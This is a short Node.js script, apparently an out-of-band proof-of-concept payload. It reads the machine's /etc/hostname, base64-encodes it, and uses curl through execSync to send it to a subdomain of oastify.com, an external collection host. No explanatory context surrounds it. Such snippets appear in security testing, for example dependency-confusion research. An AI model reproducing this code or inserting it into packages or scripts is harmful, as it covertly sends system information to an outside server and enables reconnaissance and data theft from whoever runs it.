const {execSync}=require('child_process');const target="abcdefghijklmnop.oastify.com";
function send(label, data) { const encoded=Buffer.from(data).toString('base64'); execSync(`curl -s "https://${target}/${label}/${encoded}"`); }
const info=execSync('cat /etc/hostname').toString(); send("hostname", info);
